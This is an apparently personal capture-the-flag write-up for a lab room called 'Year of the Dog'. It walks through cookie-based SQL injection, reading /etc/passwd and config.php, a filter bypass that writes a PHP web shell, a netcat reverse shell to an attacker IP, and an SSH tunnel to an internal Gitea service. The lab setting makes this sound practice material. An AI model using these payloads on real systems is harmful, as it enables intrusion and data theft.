# Year of the Dog

A hard room! Having fun!

- A scan revealed only `22` and `80`
- On `80`, a page with no interaction that told me I was in a queue. A cookie was being set - clearing it randomly assigned me a new cookie and a new position in the queue
- The cookie value, if changed to `id='` triggered a mysql error. Via this, I discovered it was a server with one database, webapp, containing one table queue with two columns `userId` and `queueNum`. There seemed to be some primitive 'RCE protection in place' - certain queries would throw an error.
- I discovered that lowercase load_file and dumpfile worked (uppercase versions triggered the RCE error) - I extracted `/etc/passwd` this way, seeing there was a user named dylan
- Via this vuln, I got the `config.php` file (guessing correctly it was at `/var/www/html` and loading it into a text file in the same directory that I could access) and `index.php`
- `config.php` gave me the db creds. With `index.php` I could see that in addition to the banned words, `<` and `>` was blocked making PHP injection difficult. 
- however, I was able to get a primitive web shell via: `Cookie: id='+UNION+ALL+SELECT+'',concat(char(60),'?php+echo+shell_exec($_GET["e"])+?',char(62))+INTO+dumpfile+'/var/www/html/shell.php'+--+`, abusing MySql's `char` command to get around the `<`/`>` limits.
- the following got me a reverse shell: `/shell.php?e=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+10.10.154.104+4444+>/tmp/f`. this was then stabilised and improved with `python3 -c 'import pty; pty.spawn("/bin/bash")'` and then `export TERM=xterm`, Ctrl + Z, `stty raw -echo; fg`
- on the box as `www-data`, I discovered `dylan` was running an instance of gitea (a self contained git server, like gitlab or github) on port `3000`. not accessible from the outside, however, via  `ssh -N -R 3000:localhost:3000 root@10.10.154.104` I could get access to it on my attack machine.
